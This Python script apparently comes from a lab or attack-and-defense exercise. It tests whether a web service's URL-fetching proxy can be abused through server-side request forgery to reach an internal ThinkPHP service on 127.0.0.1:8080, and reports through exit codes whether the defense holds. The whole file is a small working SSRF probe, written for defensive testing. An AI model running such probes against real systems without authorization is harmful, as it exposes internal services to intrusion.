#!/usr/bin/env python3
"""SSRF exploit — tests if web1 SSRF proxy can reach internal web2.

Returns 0 if attack succeeds (defense failed), non-zero if blocked (defense holds).
"""
import argparse
import urllib.request
import sys


def health_check(base):
    """Check service is up and external network access works (not the internal SSRF)."""
    ok = True
    try:
        body = urllib.request.urlopen(base, timeout=10).read().decode()
        print(f'[health] main page OK ({len(body)} bytes)')
    except Exception as e:
        print(f'[health] FAILED: main page ({e})')
        ok = False

    # Check external network access (e.g. Baidu) — this is normal functionality,
    # NOT the vulnerability. The vuln is reaching internal services.
    try:
        resp = urllib.request.urlopen(f'{base}/?url=https://www.baidu.com', timeout=10)
        if resp.status == 200 and len(resp.read()) > 1000:
            print('[health] external network (baidu.com) OK')
        else:
            print(f'[health] WARNING: external access returned {resp.status}')
            ok = False
    except Exception as e:
        print(f'[health] external network check skipped ({e})')
    return ok


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default='http://127.0.0.1')
    args = parser.parse_args()

    base = args.target.rstrip('/')

    health_check(base)

    # Try to reach internal web2 via SSRF proxy
    try:
        body = urllib.request.urlopen(f'{base}/?url=http://127.0.0.1:8080/', timeout=10).read().decode()
    except Exception:
        print('[exp] connection failed')
        sys.exit(1)

    if 'Welcome to ThinkPHP' in body:
        # Can reach internal service → attack succeeds
        print('[exp] SSRF works, internal web2 reachable — attack succeeds')
        sys.exit(0)

    # Check if explicitly blocked
    if 'blocked' in body:
        print('[exp] SSRF blocked — defense holds')
        sys.exit(1)

    # Default: assume attack works
    print('[exp] SSRF not blocked — attack succeeds')
    sys.exit(0)


if __name__ == '__main__':
    main()
